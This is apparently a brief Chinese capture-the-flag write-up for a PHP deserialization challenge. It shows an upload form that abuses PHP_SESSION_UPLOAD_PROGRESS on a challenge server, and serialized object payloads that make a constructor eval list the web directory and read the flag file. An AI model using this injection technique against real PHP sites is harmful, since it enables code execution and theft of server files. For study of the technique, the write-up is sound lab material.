#出题：反序列化

##WP
源码泄露：WWW.ZIP


审代码，发现访问session页面,传入get型参数a=s:7:"phpinfo"跳转phpinfo页面

构建一个表单上传到session.php，利用filename参数构造php_serialize的反序列
```
<form action="http://54.200.169.99:7000/session.php?" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
    <input type="file" name="file" />
    <input type="submit" />
</form>
```

## wp2
![](https://i.loli.net/2018/11/14/5bec065f83066.png)

利用poc.php构造一些查询语句，让php
-serialize 构造的序列化，被php反解出来执行构造函数的eval

查当前目录下文件
```
|O:4:\"Anti\":1:{s:4:\"info\";s:42:\"print_r(scandir(\"/home/wwwroot/default\"));\";}
```

查内容
```
|O:4:\"Anti\":1:{s:4:\"info\";s:65:\"print_r(file_get_contents(\"/home/wwwroot/default/f1ag_i3_h3re\"));\";}
```

原题payload
```
https://blog.spoock.com/2016/11/15/jarvisoj-web-writeup-1/
```
